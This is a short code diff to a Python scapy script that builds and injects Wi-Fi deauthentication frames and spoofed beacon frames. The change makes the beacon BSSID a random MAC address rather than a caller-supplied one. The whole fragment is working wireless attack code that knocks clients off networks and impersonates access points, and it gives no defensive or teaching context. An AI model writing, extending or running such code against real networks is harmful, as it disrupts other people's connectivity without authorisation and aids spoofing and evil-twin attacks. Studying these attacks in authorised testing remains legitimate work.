@@ -1,4 +1,4 @@
-from scapy.all import sendp, Dot11, RadioTap, Dot11Deauth, Dot11Beacon, Dot11Elt
+from scapy.all import sendp, Dot11, RadioTap, Dot11Deauth, Dot11Beacon, Dot11Elt, RandMAC
 import time
 
 
@@ -18,7 +18,9 @@ def beacon(iface: str, BSSID: str, client: str, SSID: str, timeout: int = 20, re
     sendp(packet, iface=iface, loop=1, inter=0.1)
 
 
-def deauth_with_beacon(iface: str, SSID: str, deauth_BSSID: str, deauth_client: str, beacon_BSSID: str, reason: int = 7, timeout: int = 20):
+def deauth_with_beacon(iface: str, SSID: str, deauth_BSSID: str, deauth_client: str, reason: int = 7, timeout: int = 20):
+
+    beacon_BSSID = str(RandMAC())
     deauth_packet = RadioTap() / \
         Dot11(type=0, subtype=12, addr1=deauth_client, addr2=deauth_BSSID, addr3=deauth_BSSID) / \
         Dot11Deauth(reason=reason)
